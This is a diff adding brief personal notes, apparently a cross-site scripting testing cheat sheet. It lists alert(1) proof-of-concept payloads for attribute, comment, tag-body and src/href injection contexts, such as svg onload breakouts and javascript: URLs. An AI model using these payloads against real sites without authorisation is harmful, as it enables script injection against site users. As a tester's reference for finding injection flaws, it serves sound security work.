@@ -1,0 +1,21 @@
+html injection
+
+when input value lands in the attritube for example <p>name='input value' placeholder='input value'</p>
+or ig value is placed in comment filter this by '-->'
+
+<svg onload=alert(1)>
+"><svg onload=alert(1)>
+
+when input lands inside or between opening or closing of the following
+<title><style><noscript><textarea><pre><xmp><iframe>
+
+</tag><svg onload=alert(1)>
+</tag><svg onload=alert(1)>
+
+---------------------------------------------------------------------------------
+html injection source 
+use when input lands as a value of the following html tag attribute src , value , data , href,
+javascript:alert(1)
+
+---------------------------------------------------------------------------------
+
